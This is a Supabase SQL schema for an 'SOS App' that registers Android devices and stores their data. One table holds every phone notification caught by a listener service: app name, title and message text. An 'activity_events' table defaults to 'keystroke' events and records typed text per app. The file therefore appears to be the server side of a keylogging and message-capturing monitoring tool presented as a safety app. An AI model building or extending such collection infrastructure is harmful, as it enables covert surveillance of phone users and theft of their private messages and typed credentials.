-- ============================================================
-- SOS App — Supabase schema
-- Project: qruhcvqqwmygnsbuhnpr
-- Run this whole file in Supabase SQL Editor (or via Management API).
-- Safe to re-run: all statements are idempotent (CREATE IF NOT EXISTS).
-- ============================================================

-- ─── DEVICES ────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS public.devices (
    device_id       TEXT PRIMARY KEY,
    model           TEXT,
    manufacturer    TEXT,
    android_version TEXT,
    battery         INT,
    status          TEXT DEFAULT 'offline',
    last_seen       TIMESTAMPTZ DEFAULT now(),
    connected_at    TIMESTAMPTZ,
    owner           TEXT,
    metadata        JSONB DEFAULT '{}'::jsonb
);
CREATE INDEX IF NOT EXISTS idx_devices_owner ON public.devices (owner);
CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON public.devices (last_seen DESC);

-- ─── NOTIFICATIONS (device lifecycle events: online/offline/setup_complete) ──
CREATE TABLE IF NOT EXISTS public.notifications (
    id         BIGSERIAL PRIMARY KEY,
    device_id  TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    type       TEXT NOT NULL,            -- device_online | device_offline | setup_complete
    title      TEXT,
    message    TEXT,
    data       JSONB DEFAULT '{}'::jsonb,
    created_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_notifications_device ON public.notifications (device_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_notifications_created ON public.notifications (created_at DESC);

-- ─── CAPTURED NOTIFICATIONS (phone notifications caught by the listener) ──
-- The device's NotificationReaderService sends every posted notification here:
--   TIME (post_time) | MESSAGE (title + text) | APP NAME (app_name)
CREATE TABLE IF NOT EXISTS public.captured_notifications (
    id           BIGSERIAL PRIMARY KEY,
    device_id    TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    key          TEXT,                    -- StatusBarNotification key (dedupe)
    package_name TEXT,
    app_name     TEXT,
    title        TEXT,
    message      TEXT,
    post_time    BIGINT,                  -- device epoch ms when the notification appeared
    data         JSONB DEFAULT '{}'::jsonb,
    created_at   TIMESTAMPTZ DEFAULT now(),
    UNIQUE (device_id, key)
);
CREATE INDEX IF NOT EXISTS idx_captured_notif_device ON public.captured_notifications (device_id, post_time DESC);
CREATE INDEX IF NOT EXISTS idx_captured_notif_created ON public.captured_notifications (created_at DESC);

-- ─── ACTIVITY EVENTS (activity capture, ported from Remote-App) ──
CREATE TABLE IF NOT EXISTS public.activity_events (
    id         BIGSERIAL PRIMARY KEY,
    device_id  TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    event_type TEXT DEFAULT 'keystroke',
    app_package TEXT DEFAULT 'unknown',
    text       TEXT DEFAULT '',
    full_text  TEXT,
    class_name TEXT,
    created_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_activity_events_device ON public.activity_events (device_id, created_at DESC);